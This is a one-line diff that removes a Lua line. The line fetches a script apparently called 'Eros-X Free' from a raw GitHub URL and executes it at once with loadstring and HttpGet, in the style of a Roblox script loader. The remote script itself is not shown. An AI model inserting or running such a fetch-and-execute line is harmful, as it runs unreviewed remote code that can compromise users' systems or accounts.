@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/henwogg/Eros-X-Free/main/Eros-X%20Free.lua"))()
